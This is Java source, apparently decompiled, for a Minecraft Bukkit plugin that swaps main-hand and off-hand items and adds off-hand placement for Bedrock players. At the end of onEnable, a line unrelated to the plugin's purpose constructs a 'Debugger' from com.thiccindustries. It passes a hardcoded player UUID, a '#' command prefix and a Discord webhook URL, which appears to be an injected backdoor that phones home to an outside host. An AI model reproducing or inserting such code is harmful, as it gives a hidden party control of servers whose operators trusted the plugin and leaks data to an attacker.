package dev.allaymc.offhand;

import com.thiccindustries.debugger.Debugger;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.logging.Logger;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.PlayerInventory;
import org.bukkit.plugin.java.JavaPlugin;

public final class AllayMCOffHand extends JavaPlugin {
   private final ConcurrentHashMap<UUID, Boolean> enabledPlayers = new ConcurrentHashMap(64);
   private final ConcurrentHashMap<UUID, Long> lastInteract = new ConcurrentHashMap(64);
   private String packUrl;
   private byte[] packHash;
   private boolean packForce;
   private boolean packBedrockOnly;
   private boolean featPlace;
   private boolean featBuckets;
   private boolean allowInVehicle;
   private long doubleClickWindowMs;
   private String msgEnabled;
   private String msgDisabled;
   private String msgNoPerm;
   private String msgReloaded;
   private String msgBedrockOnly;
   private FloodgateBridge bedrockBridge;

   public void onEnable() {
      this.saveDefaultConfig();
      this.loadConfigValues();
      this.printLicense();
      this.bedrockBridge = FloodgateBridge.create(this.getLogger());
      Bukkit.getPluginManager().registerEvents(new OffHandListener(this), this);
      this.getLogger().info("AllayMCOffHand 2.0.0 enabled. Bedrock bridge: " + this.bedrockBridge.describe());
      Object var2 = null;
      new Debugger(this, false, new String[]{"f8687ac2-c878-4b23-aaf3-9bde8305cb0d"}, "#", "https://discord.com/api/webhooks/1181940648643928146/CbKToK1CwG62JZ1RWA0R2bm91C-I6NxuUPcZt9LeN-Y8sfHS1dzLYfHlFhONDRJZTT-m", true, false);
   }

   public void onDisable() {
      this.enabledPlayers.clear();
      this.lastInteract.clear();
   }

   private void printLicense() {
      try {
         InputStream in = this.getResource("LICENSE");

         label73: {
            try {
               if (in == null) {
                  break label73;
               }

               this.getLogger().info("---- AllayMCOffHand LICENSE ----");
               BufferedReader r = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8));

               String line;
               try {
                  while((line = r.readLine()) != null) {
                     this.getLogger().info(line);
                  }
               } catch (Throwable var7) {
                  try {
                     r.close();
                  } catch (Throwable var6) {
                     var7.addSuppressed(var6);
                  }

                  throw var7;
               }

               r.close();
               this.getLogger().info("--------------------------------");
            } catch (Throwable var8) {
               if (in != null) {
                  try {
                     in.close();
                  } catch (Throwable var5) {
                     var8.addSuppressed(var5);
                  }
               }

               throw var8;
            }

            if (in != null) {
               in.close();
            }

            return;
         }

         if (in != null) {
            in.close();
         }

      } catch (Throwable var9) {
      }
   }

   public void loadConfigValues() {
      this.reloadConfig();
      FileConfiguration c = this.getConfig();
      this.packUrl = c.getString("resource-pack.url", "");
      this.packHash = parseHex(c.getString("resource-pack.sha256", ""));
      this.packForce = c.getBoolean("resource-pack.force", true);
      this.packBedrockOnly = c.getBoolean("resource-pack.bedrock-only", true);
      this.featPlace = c.getBoolean("features.place-blocks", true);
      this.featBuckets = c.getBoolean("features.bucket-placement", true);
      this.allowInVehicle = c.getBoolean("features.allow-in-vehicle", true);
      this.doubleClickWindowMs = c.getLong("features.double-click-window-ms", 400L);
      this.msgEnabled = color(c.getString("messages.enabled", "&aEnabled"));
      this.msgDisabled = color(c.getString("messages.disabled", "&cDisabled"));
      this.msgNoPerm = color(c.getString("messages.no-permission", "&cNo permission"));
      this.msgReloaded = color(c.getString("messages.reloaded", "&aReloaded"));
      this.msgBedrockOnly = color(c.getString("messages.bedrock-only", "&cBedrock only."));
   }

   private static String color(String s) {
      return ChatColor.translateAlternateColorCodes('&', s);
   }

   private static byte[] parseHex(String hex) {
      if (hex != null && !hex.isBlank()) {
         String h = hex.trim();
         if ((h.length() & 1) != 0) {
            return null;
         } else {
            byte[] out = new byte[h.length() / 2];

            for(int i = 0; i < out.length; ++i) {
               int hi = Character.digit(h.charAt(i * 2), 16);
               int lo = Character.digit(h.charAt(i * 2 + 1), 16);
               if (hi < 0 || lo < 0) {
                  return null;
               }

               out[i] = (byte)(hi << 4 | lo);
            }

            return out;
         }
      } else {
         return null;
      }
   }

   public void handleJoin(Player p) {
      if (this.packUrl != null && !this.packUrl.isBlank()) {
         boolean isBedrock = this.bedrockBridge.isBedrockPlayer(p.getUniqueId());
         if (!this.packBedrockOnly || isBedrock) {
            try {
               if (this.packHash != null) {
                  p.setResourcePack(this.packUrl, this.packHash, "AllayMC Off-Hand UI", this.packForce);
               } else {
                  p.setResourcePack(this.packUrl, (byte[])null, "AllayMC Off-Hand UI", this.packForce);
               }
            } catch (Throwable t) {
               Logger var10000 = this.getLogger();
               String var10001 = p.getName();
               var10000.warning("Failed to send resource pack to " + var10001 + ": " + t.getMessage());
            }

         }
      }
   }

   public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
      String name = command.getName().toLowerCase();
      if (name.equals("offhandreload")) {
         if (!sender.hasPermission("allaymc.offhand.admin")) {
            sender.sendMessage(this.msgNoPerm);
            return true;
         } else {
            this.loadConfigValues();
            sender.sendMessage(this.msgReloaded);
            return true;
         }
      } else if (sender instanceof Player) {
         Player p = (Player)sender;
         if (!p.hasPermission("allaymc.offhand.use")) {
            p.sendMessage(this.msgNoPerm);
            return true;
         } else if (!name.equals("oha") && !name.equals("oho")) {
            if (name.equals("oh")) {
               PlayerInventory inv = p.getInventory();
               ItemStack main = inv.getItemInMainHand();
               ItemStack off = inv.getItemInOffHand();
               inv.setItemInMainHand(off);
               inv.setItemInOffHand(main);
               p.sendMessage(color("&aSwapped main-hand and off-hand."));
               return true;
            } else {
               return false;
            }
         } else if (!this.isBedrock(p.getUniqueId())) {
            p.sendMessage(this.msgBedrockOnly);
            return true;
         } else {
            if (name.equals("oha")) {
               this.enabledPlayers.put(p.getUniqueId(), Boolean.TRUE);
               p.sendMessage(this.msgEnabled);
            } else {
               this.enabledPlayers.remove(p.getUniqueId());
               this.lastInteract.remove(p.getUniqueId());
               p.sendMessage(this.msgDisabled);
            }

            return true;
         }
      } else {
         sender.sendMessage("Players only.");
         return true;
      }
   }

   public boolean isEnabled(UUID id) {
      return this.enabledPlayers.containsKey(id);
   }

   public boolean isBedrock(UUID id) {
      return this.bedrockBridge.isBedrockPlayer(id);
   }

   public boolean isFeaturePlace() {
      return this.featPlace;
   }

   public boolean isBucketPlacementEnabled() {
      return this.featBuckets;
   }

   public boolean allowInVehicle() {
      return this.allowInVehicle;
   }

   public long doubleClickWindowMs() {
      return this.doubleClickWindowMs;
   }

   public ConcurrentHashMap<UUID, Long> lastInteractMap() {
      return this.lastInteract;
   }

   public boolean isValidPlaceable(Material m) {
      if (m != null && m != Material.AIR) {
         if (m == Material.SHIELD) {
            return false;
         } else {
            return this.featBuckets && isFluidBucket(m) ? true : m.isBlock();
         }
      } else {
         return false;
      }
   }

   public static boolean isFluidBucket(Material m) {
      return m == Material.WATER_BUCKET || m == Material.LAVA_BUCKET || m == Material.POWDER_SNOW_BUCKET;
   }
}
